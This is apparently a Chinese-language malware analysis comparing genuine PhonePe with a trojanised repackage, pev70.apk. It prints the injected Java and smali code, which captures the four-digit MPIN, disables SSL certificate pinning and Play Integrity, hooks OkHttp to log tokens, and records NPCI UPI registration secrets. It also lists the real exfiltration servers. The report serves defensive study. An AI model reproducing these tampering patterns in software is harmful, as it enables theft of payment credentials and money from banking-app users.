# pev70 与原始 PhonePe APK 字节码对比分析

> 分析目标：对比原始 PhonePe APK (v24.08.23) 与被篡改的 pev70.apk，识别所有 DEX 字节码静态篡改点
> 分析时间：2026-01-28

---

## 目录

1. [原始APK真实性验证](#1-原始apk真实性验证)
2. [APK结构对比](#2-apk结构对比)
3. [DEX字节码篡改清单](#3-dex字节码篡改清单)
4. [详细篡改分析](#4-详细篡改分析)
5. [新增恶意文件清单](#5-新增恶意文件清单)
6. [攻击技术总结](#6-攻击技术总结)

---

## 1. 原始APK真实性验证

### 签名证书对比

| 属性 | 原始 PhonePe APK | pev70 (被篡改) |
|------|-----------------|----------------|
| **所有者 (Owner)** | `CN=Vivek Soneja, OU=PhonePe, O=PhonePe, L=Bangalore, ST=Karnataka, C=IN` | `CN=John Doe, OU=MyOrg, O=MyCompany, L=New York, ST=NY, C=US` |
| **有效期起始** | 2016-06-01 | 2026-01-27 |
| **有效期截止** | 2066-05-20 | 2225-12-10 |
| **SHA1 指纹** | `4E:50:B6:ED:1A:BA:B9:45:97:68:BF:C0:D9:10:DD:1A:53:16:B9:7F` | `92:C0:0F:3F:B2:B6:50:3C:3D:4A:47:68:86:B3:D1:1B:24:15:A1:F7` |
| **SHA256 指纹** | `53:35:BC:49:61:58:0B:2E:39:CF:E6:61:35:53:86:63:68:40:68:6A:D0:0B:8D:C1:60:61:D2:22:36:AA:7D:13` | `04:BB:30:3A:63:DC:97:15:CE:42:3C:61:52:6B:7D:10:69:EC:C1:6C:65:4C:83:7A:4D:29:87:52:37:7E:39:92` |

### 验证结论

✅ **原始 APK 确认为正版 PhonePe**
- 签名者为 PhonePe 公司员工 Vivek Soneja（班加罗尔，印度）
- 证书从 2016 年生效，与 PhonePe 成立时间一致
- SHA1 指纹可与 Google Play 上架版本交叉验证

❌ **pev70 使用伪造签名**
- 签名者为虚假身份 "John Doe, MyOrg, MyCompany, New York"
- 证书于 2026-01-27 刚刚生成（极近期）
- 有效期设为 200 年（异常）

---

## 2. APK结构对比

### DEX 文件数量

| APK | DEX 文件数 | DEX 文件列表 |
|-----|-----------|-------------|
| **原始** | 10 个 | classes.dex, classes2-10.dex |
| **pev70** | 15 个 | classes.dex, classes2-15.dex |

**新增 5 个 DEX 文件**：`classes11.dex` ~ `classes15.dex`（包含全部恶意注入代码）

### 文件数量对比

| APK | 文件总数 | APK 大小 |
|-----|---------|---------|
| **原始** | 6,953 | 57.5 MB |
| **pev70** | 7,602 | 88 MB |
| **差异** | +649 文件 | +30.5 MB |

### DEX 文件大小对比

| DEX 文件 | 原始大小 | pev70 大小 | 增长 |
|---------|---------|-----------|------|
| classes.dex | 9.5 MB | 14.6 MB | +54% |
| classes2.dex | 9.6 MB | 16.9 MB | +76% |
| classes3.dex | 10.9 MB | 15.0 MB | +38% |

**说明**：现有 DEX 文件大幅增大，表明原有类被直接修改注入了恶意代码。

---

## 3. DEX字节码篡改清单

### 3.1 被直接篡改的原始类（10个）

以下类存在于原始 APK 中，但在 pev70 中被直接修改字节码：

| # | 类名 | 原始位置 | pev70位置 | 篡改目的 |
|---|------|---------|-----------|---------|
| 1 | `com.phonepe.app.PhonePeApplication` | smali_classes3 | smali | **入口点注入**：初始化 Pine Hook + 远程日志 + Plugin 系统 |
| 2 | `com.phonepe.login.common.ui.hurdle.viewmodel.MpinHurdleViewModel` | smali_classes6 | smali_classes2 | **MPIN 窃取**：捕获用户输入的 4 位支付密码 |
| 3 | `okhttp3.OkHttpClient$Builder` | smali_classes9 | smali_classes3 | **HTTP 劫持**：替换 build() 方法，注入拦截器 |
| 4 | `okhttp3.OkHttpClient` | smali_classes9 | smali_classes3 | **WebSocket 监控**：包装所有 WebSocket 监听器 |
| 5 | `okhttp3.CertificatePinner` | smali_classes9 | smali_classes3 | **SSL Pinning 绕过**：禁用证书校验 |
| 6 | `okhttp3.internal.Util` | smali_classes9 | smali_classes3 | **敏感Header暴露**：禁用 Header 过滤保护 |
| 7 | `okhttp3.Request$Builder` | smali_classes9 | smali_classes3 | **Header 窃取**：记录所有 HTTP 请求头 |
| 8 | `com.phonepe.phonepecore.playintegrity.config.PlayIntegrityConfigProviderImpl` | smali_classes7 | smali_classes3 | **Play Integrity 绕过**：禁用完整性校验 |
| 9 | `com.phonepe.network.base.rest.request.generic.GenericRestData` | smali_classes6 | smali_classes2 | **请求体窃取**：记录所有 REST 请求 JSON |
| 10 | `org.npci.upi.security.services.CLServices` | smali_classes9 | smali_classes3 | **UPI 安全监控**：记录所有 NPCI 服务调用 |
| 11 | `org.npci.upi.security.services.CLRemoteResultReceiver` | smali_classes9 | smali_classes13 | **交易结果拦截**：包装 ResultReceiver |

### 3.2 新增的恶意类（伪装在原有包路径下）

以下类在原始 APK 中**不存在**，是攻击者新增并伪装在合法包路径下：

| # | 伪装类名 | pev70位置 | 真实用途 |
|---|---------|-----------|---------|
| 1 | `com.phonepe.app.util.LoginSessionUtils` | smali_classes2 | 登录会话劫持，阻止用户登出 |
| 2 | `com.phonepe.network.external.rest.interceptors.ChecksumInterceptorCore` | smali_classes2 | 绕过请求校验，注入设备指纹 |
| 3 | `dagger.hilt.android.internal.managers.ActivityComponentManager` | smali_classes3 | 劫持 Dagger 依赖注入容器 |
| 4 | `com.phonepe.onboarding.preference.OnBoardingConfig` | smali_classes3 | 强制启用 OTP 输入框 |
| 5 | `com.phonepe.phonepecore.data.preference.entities.OtpHurdleMeta` | smali_classes10 | 控制 OTP 手动输入状态 |
| 6 | `com.phonepe.phonepecore.data.preference.CoreConfig` | smali_classes3 | 监控用户状态变化 |
| 7 | `com.phonepe.hurdleui.otpreceiver.OtpReceiverDelegate` | smali_classes9 | OTP 接收事件拦截 |
| 8 | `com.phonepe.network.external.rest.rsa.RSAWrapper` | smali_classes2 | 加密数据窃取/伪造 |

---

## 4. 详细篡改分析

### 4.1 PhonePeApplication — 应用入口点注入

**原始代码** (`attachBaseContext` 方法)：
```java
@Override
public void attachBaseContext(Context context) {
    super.attachBaseContext(context);
    SplitCompat.install(this);
}
```

**篡改后代码**：
```java
@Override
public void attachBaseContext(Context context) throws JSONException {
    super.attachBaseContext(context);
    SplitCompat.install(this);

    // ========== 以下为注入代码 ==========
    Log.d("PhonePeTweak", "attachBaseContext");       // 日志标记
    Pine.ensureInitialized();                          // 初始化 Pine Hook 框架
    System.setProperty("kotlinx.coroutines.debug", "on");

    String android_id = Settings.Secure.getString(
        getContentResolver(), "android_id");
    Z.InitConfig(android_id, "", null);                // 初始化远程日志系统 (zerolog)
    Plugin.attach(this);                               // 启动 Plugin 系统 → PineHelper
}
```

**Smali 字节码证据** (`pev70_apktool/smali/com/phonepe/app/PhonePeApplication.smali`)：
```smali
.line 43
const-string p1, "PhonePeTweak"
const-string v0, "attachBaseContext"
invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

.line 44
invoke-static {}, Ltop/canyie/pine/Pine;->ensureInitialized()V

.line 51
invoke-static {v0, p1, v1}, Lcom/zerolog/Z;->InitConfig(Ljava/lang/String;Ljava/lang/String;Lorg/json/JSONObject;)V

.line 52
invoke-static {p0}, Lcom/myairtelapp/plugin/Plugin;->attach(Landroid/content/Context;)V
```

**功能**：
- 初始化 **Pine** inline hook 框架，用于运行时方法替换
- 初始化 **zerolog** 远程日志系统，用于数据外泄
- 启动 **Plugin** 系统，注册各类 Pine Hook

---

### 4.2 MpinHurdleViewModel — MPIN 支付密码窃取

**原始代码** (`h6` 方法，处理 PIN 输入)：
```java
public final void h6(String pin) {
    Intrinsics.checkNotNullParameter(pin, "pin");
    this._mPin.setValue(pin);
    // ... 正常业务逻辑 ...
}
```

**篡改后代码**：
```java
public final void h6(String pin) {
    Intrinsics.checkNotNullParameter(pin, "pin");
    this._mPin.setValue(pin);

    // ========== 以下为注入代码 ==========
    if (pin.length() == 4) {                           // 当 PIN 长度达到4位时
        Z.debug().str("pin", pin).msg("pin_input");    // 记录到远程日志
        PhonePeHelper.LastMpin = pin;                  // 存储到静态字段，等待外泄
    }
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes2/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali`)：
```smali
.line 38
invoke-virtual {p1}, Ljava/lang/String;->length()I
move-result v1
const/4 v2, 0x4
if-ne v1, v2, :cond_0          # 如果长度 != 4，跳过

.line 39
invoke-static {}, Lcom/zerolog/Z;->debug()Lcom/zerolog/Z$EventWrapper;
move-result-object v1
invoke-virtual {v1, v0, p1}, Lcom/zerolog/Z$EventWrapper;->str(Ljava/lang/String;Ljava/lang/String;)Lcom/zerolog/Z$EventWrapper;
move-result-object v0
const-string/jumbo v1, "pin_input"
invoke-virtual {v0, v1}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V

.line 40
sput-object p1, Lcom/PhonePeTweak/Def/PhonePeHelper;->LastMpin:Ljava/lang/String;
```

**功能**：
- 当用户输入完 4 位 MPIN 时，立即捕获明文密码
- 通过 zerolog 实时上报到远程服务器
- 同时存储在 `PhonePeHelper.LastMpin` 供其他模块使用

---

### 4.3 OkHttpClient$Builder — HTTP 请求劫持

**原始代码** (`build` 方法)：
```java
public OkHttpClient build() {
    return new OkHttpClient(this);
}
```

**篡改后代码**：
```java
public OkHttpClient build() {
    return HookUtil.build(this);   // 完全替换为 HookUtil 实现
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes3/okhttp3/OkHttpClient$Builder.smali`)：
```smali
.method public final build()Lokhttp3/OkHttpClient;
    invoke-static {p0}, Lcom/PhonePeTweak/Def/HookUtil;->build(Lokhttp3/OkHttpClient$Builder;)Lokhttp3/OkHttpClient;
    move-result-object v0
    return-object v0
.end method
```

**HookUtil.build() 实现**（注入的拦截器）：
1. `HttpLoggingInterceptor` — 记录完整 HTTP 请求/响应体
2. `PhonePeInterceptor` — 窃取 Token、会话信息
3. `HttpJsonInterceptor` — 结构化 JSON 日志记录

**功能**：
- 劫持所有 OkHttp 网络请求
- 可读取/修改所有 HTTP 流量
- 窃取认证 Token、支付数据

---

### 4.4 CertificatePinner — SSL Pinning 完全绕过

**原始代码** (`check` 方法，校验服务器证书)：
```java
public void check(String hostname, List<Certificate> peerCertificates) {
    List<Pin> pins = findMatchingPins(hostname);
    if (pins.isEmpty()) return;  // 无配置则跳过

    // ... 复杂的证书链验证逻辑 ...

    if (!validationPassed) {
        throw new SSLPeerUnverifiedException("Certificate pinning failure!");
    }
}
```

**篡改后代码**：
```java
public void check(String hostname, List<Certificate> peerCertificates) {
    Z.debug().str("s", hostname)
             .str("list0", peerCertificates.toString())
             .msg("CertificatePinner.check");
    return;   // 直接返回，不做任何校验！
}

public List<Pin> findMatchingPins(String hostname) {
    Z.debug().str("s", hostname).msg("CertificatePinner.findMatchingPins");
    return Collections.emptyList();   // 返回空列表，永远不匹配
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes3/okhttp3/CertificatePinner.smali`)：
```smali
# check() 方法 - 仅记录日志后直接返回
.method public final check(Ljava/lang/String;Ljava/util/List;)V
    ...
    invoke-virtual {p1, p2}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V
    return-void                    # 不校验，直接返回！
.end method

# findMatchingPins() 方法 - 返回空列表
.method public final findMatchingPins(Ljava/lang/String;)Ljava/util/List;
    ...
    sget-object p1, Lkotlin/collections/EmptyList;->INSTANCE:Lkotlin/collections/EmptyList;
    return-object p1               # 返回空列表！
.end method
```

**功能**：
- 完全禁用 SSL Certificate Pinning
- 允许中间人攻击 (MITM)
- 攻击者可拦截所有 HTTPS 流量

---

### 4.5 PlayIntegrityConfigProviderImpl — Play Integrity 绕过

**原始代码** (`e` 方法，检查是否启用 Play Integrity)：
```java
public boolean e() {
    return this.playIntegrityConfig.isEnabled();
}
```

**篡改后代码**：
```java
public boolean e() {
    return HookUtil.getPlayIntegrityEnabled(this);  // 由 HookUtil 控制
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes3/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali`)：
```smali
.method public final e()Z
    invoke-static {p0}, Lcom/PhonePeTweak/Def/HookUtil;->getPlayIntegrityEnabled(...)Z
    move-result v0
    return v0
.end method
```

**HookUtil.getPlayIntegrityEnabled() 实现**：
```java
public static boolean getPlayIntegrityEnabled(PlayIntegrityConfigProviderImpl impl) {
    return false;  // 始终返回 false，禁用 Play Integrity
}
```

**功能**：
- 禁用 Google Play Integrity API 校验
- 服务器无法检测 APK 被篡改
- 绕过设备完整性检查

---

### 4.6 CLServices — NPCI UPI 安全服务监控

**原始代码** (NPCI UPI 安全服务，无日志)：
```java
public String getChallenge(String type, String deviceId) {
    // ... 调用底层安全模块 ...
    return challenge;
}

public boolean registerApp(String appId, String secret, String token, String deviceId, String extra) {
    // ... UPI 应用注册逻辑 ...
    return result;
}
```

**篡改后代码**：
```java
public String getChallenge(String type, String deviceId) {
    String result = originalGetChallenge(type, deviceId);

    // ========== 注入的日志代码 ==========
    Z.info().str("type", type)
            .str("deviceId", deviceId)
            .str("result", result)
            .msg("CLServices_getChallenge called with parameters");
    return result;
}

public boolean registerApp(String appId, String secret, String token, String deviceId, String extra) {
    // ========== 注入的日志代码 - 记录所有参数 ==========
    Z.info().str("param", appId)
            .str("param1", secret)      // 应用密钥！
            .str("param2", token)       // 认证Token！
            .str("param3", deviceId)
            .str("param4", extra)
            .msg("CLServices_registerApp called with parameters");

    boolean result = originalRegisterApp(appId, secret, token, deviceId, extra);

    Z.info().bool("result", result).msg("CLServices_registerApp");
    return result;
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes3/org/npci/upi/security/services/CLServices.smali`)：
```smali
# getChallenge 方法日志注入
invoke-static {}, Lcom/zerolog/Z;->info()Lcom/zerolog/Z$EventWrapper;
const-string/jumbo v2, "type"
invoke-virtual {v1, v2, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)V
const-string v1, "deviceId"
invoke-virtual {p1, v1, p2}, Lcom/zerolog/Z$EventWrapper;->str(...)V
const-string p2, "CLServices_getChallenge called with parameters"
invoke-virtual {p1, p2}, Lcom/zerolog/Z$EventWrapper;->msg(...)V

# registerApp 方法日志注入 - 记录5个参数
const-string v1, "param"
invoke-virtual {v0, v1, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)V   # appId
const-string v1, "param1"
invoke-virtual {v0, v1, p2}, Lcom/zerolog/Z$EventWrapper;->str(...)V   # secret
const-string v1, "param2"
invoke-virtual {v0, v1, p3}, Lcom/zerolog/Z$EventWrapper;->str(...)V   # token
...
```

**功能**：
- 监控所有 NPCI UPI 安全服务调用
- 窃取 UPI 应用注册凭证（appId、secret、token）
- 记录设备绑定信息

---

### 4.7 CLRemoteResultReceiver — UPI 交易结果拦截

**原始代码** (构造函数)：
```java
public CLRemoteResultReceiver(ResultReceiver resultReceiver) {
    this.resultReceiver = resultReceiver;
}
```

**篡改后代码**：
```java
public CLRemoteResultReceiver(ResultReceiver resultReceiver) {
    // 用 LoggingCLResultReceiver 包装原始接收器
    this.resultReceiver = new LoggingCLResultReceiver(resultReceiver);
}
```

**Smali 字节码证据** (`pev70_apktool/smali_classes13/org/npci/upi/security/services/CLRemoteResultReceiver.smali`)：
```smali
new-instance v0, Lcom/PhonePeTweak/Def/LoggingCLResultReceiver;
invoke-direct {v0, p1}, Lcom/PhonePeTweak/Def/LoggingCLResultReceiver;-><init>(Landroid/os/ResultReceiver;)V
```

**功能**：
- 拦截所有 UPI 交易结果回调
- 记录交易成功/失败状态
- 窃取交易详情（金额、收款方、时间戳等）

---

### 4.8 其他篡改点

| 类 | 篡改方法 | 注入代码 | 功能 |
|---|---------|---------|------|
| `Util` | `isSensitiveHeader()` | `HookUtil.isSensitiveHeader()` | 返回 false，暴露敏感 Header |
| `Request$Builder` | `addHeader()` | `HookUtil.addHeader()` | 记录所有请求头 |
| `GenericRestData` | `setBodyJSON()` | `Z.info().str("raw", body)` | 记录所有 REST 请求体 |

---

## 5. 新增恶意文件清单

### 5.1 完全新增的 DEX 文件

pev70 新增了 5 个 DEX 文件（`classes11.dex` ~ `classes15.dex`），包含所有恶意框架代码：

| DEX | 大小 | 主要内容 |
|-----|------|---------|
| classes11.dex | 11.2 MB | 原始 PhonePe 类（重新排列） |
| classes12.dex | 9.8 MB | 原始 PhonePe 类（重新排列） |
| classes13.dex | 8.7 MB | 原始 PhonePe 类 + NPCI 篡改类 |
| classes14.dex | 6.4 MB | **核心恶意代码**（com.PhonePeTweak、com.longfafa、com.zerolog 等） |
| classes15.dex | 0.3 MB | 额外恶意工具类 |

### 5.2 classes14.dex 恶意包结构

```
classes14.dex
├── com/PhonePeTweak/                    # 主注入框架
│   ├── MyInitProvider.java              # ContentProvider 入口
│   ├── MyEntryPoint.java                # 启动调度器
│   ├── PhonePeHomeScreenActivityThread.java  # 主工作线程
│   ├── ActivityLifecycleCallbacker.java # Activity 监控
│   └── Def/                             # Hook 定义
│       ├── HookUtil.java                # HTTP/签名/Play Integrity Hook
│       ├── PhonePeHelper.java           # Token/PIN 窃取工具
│       ├── PhonePeInterceptor.java      # OkHttp 拦截器
│       ├── LoggingWebSocketListener.java# WebSocket 监控
│       ├── LoggingCLResultReceiver.java # UPI 结果拦截
│       ├── Pinactivitycomponent_w.java  # UPI PIN 捕获
│       ├── Pinactivitycomponent_g.java  # NPCI Token 读取
│       └── ...
├── com/longfafa/                        # AIDL 服务框架
│   ├── pay/                             # IPayService AIDL 接口
│   └── paylib/                          # JobService 实现
├── com/zerolog/                         # 远程日志系统
│   └── Z.java                           # OTLP 日志客户端
├── com/myairtelapp/plugin/              # Pine Hook 管理器
│   ├── Plugin.java
│   └── PineHelper.java                  # Pine Hook 注册
├── top/canyie/pine/                     # Pine Hook 框架
└── com/tweakUtil/                       # 工具类
    ├── Config.java                      # 配置常量
    ├── ContextHelper.java               # 反射工具
    └── HelperUtil.java                  # 辅助函数
```

---

## 6. 攻击技术总结

### 6.1 攻击层次架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        应用层 (Application Layer)                 │
├─────────────────────────────────────────────────────────────────┤
│  PhonePeApplication.attachBaseContext()                          │
│     ├─→ Pine.ensureInitialized()        [Pine Hook 框架初始化]    │
│     ├─→ Z.InitConfig()                  [OTLP 日志初始化]         │
│     └─→ Plugin.attach()                 [PineHelper Hook 注册]    │
│                                                                   │
│  MyInitProvider.onCreate()                                        │
│     └─→ MyEntryPoint.init()                                       │
│         └─→ PhonePeHomeScreenActivityThread.start()               │
│             ├─→ ActivityLifecycleCallbacker [截图上传]            │
│             ├─→ PhonePeHelper.startPhoneNumberMonitoring() [Token]│
│             └─→ JobService [AIDL 服务]                            │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        网络层 (Network Layer)                     │
├─────────────────────────────────────────────────────────────────┤
│  OkHttpClient$Builder.build()                                     │
│     └─→ HookUtil.build()                                          │
│         ├─→ PhonePeInterceptor       [Token/会话窃取]             │
│         ├─→ HttpJsonInterceptor      [请求体记录]                 │
│         └─→ HttpLoggingInterceptor   [完整流量日志]               │
│                                                                   │
│  CertificatePinner.check()                                        │
│     └─→ return-void                  [SSL Pinning 绕过]           │
│                                                                   │
│  OkHttpClient.newWebSocket()                                      │
│     └─→ LoggingWebSocketListener     [WebSocket 监控]             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     UPI 安全层 (NPCI Security Layer)              │
├─────────────────────────────────────────────────────────────────┤
│  CLServices.getChallenge()                                        │
│     └─→ Z.info() 记录 type, deviceId, result                      │
│                                                                   │
│  CLServices.registerApp()                                         │
│     └─→ Z.info() 记录 appId, secret, token, deviceId              │
│                                                                   │
│  CLRemoteResultReceiver                                           │
│     └─→ LoggingCLResultReceiver      [交易结果拦截]               │
│                                                                   │
│  MpinHurdleViewModel.h6()                                         │
│     └─→ PhonePeHelper.LastMpin = pin [MPIN 窃取]                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                       安全绕过层 (Security Bypass)                │
├─────────────────────────────────────────────────────────────────┤
│  PlayIntegrityConfigProviderImpl.e()                              │
│     └─→ HookUtil.getPlayIntegrityEnabled() → false                │
│                                                                   │
│  PineHelper.start()                                               │
│     ├─→ Pine.hook(getPackageInfo)    [签名伪造]                   │
│     ├─→ hookCheckPermission()        [SMS 权限伪造]               │
│     └─→ hookActivity()               [Activity 拦截]              │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 数据外泄路径

| 数据类型 | 窃取位置 | 外泄方式 | 目标服务器 |
|---------|---------|---------|-----------|
| MPIN 支付密码 | MpinHurdleViewModel | zerolog + WebSocket | otlp.techru.cc:443 |
| 认证 Token | PhonePeInterceptor | zerolog + AIDL | Azure Blob + MovPay |
| HTTP 请求/响应 | HttpJsonInterceptor | zerolog | otlp.techru.cc:443 |
| UPI 交易结果 | LoggingCLResultReceiver | zerolog | otlp.techru.cc:443 |
| 应用截图 | ActivityLifecycleCallbacker | Azure Blob | techrures.blob.core.windows.net |
| NPCI 凭证 | CLServices | zerolog | otlp.techru.cc:443 |

### 6.3 攻击能力总结

| 能力 | 实现方式 |
|------|---------|
| **支付密码窃取** | MpinHurdleViewModel 字节码篡改 |
| **Token 劫持** | OkHttp 拦截器 + AIDL 服务 |
| **HTTPS 中间人** | CertificatePinner 绕过 |
| **交易监控** | CLServices/CLRemoteResultReceiver 监控 |
| **屏幕录制** | ActivityLifecycleCallbacker 截图 |
| **防篡改绕过** | Play Integrity + 签名伪造 |
| **远程控制** | AIDL IPC + WebSocket |

---

## 附录：验证命令

```bash
# 1. 验证原始 APK 签名
keytool -printcert -jarfile "PhonePe APK v24.08.23.apk"

# 2. 对比 DEX 文件数量
unzip -l "PhonePe APK v24.08.23.apk" | grep "classes.*\.dex"
unzip -l "pev70.apk" | grep "classes.*\.dex"

# 3. 搜索篡改标记
grep -r "PhonePeTweak\|zerolog\|HookUtil" pev70_apktool/smali*/

# 4. 对比特定类
diff -u phonepe_original_apktool/smali_classes3/com/phonepe/app/PhonePeApplication.smali \
       pev70_apktool/smali/com/phonepe/app/PhonePeApplication.smali
```
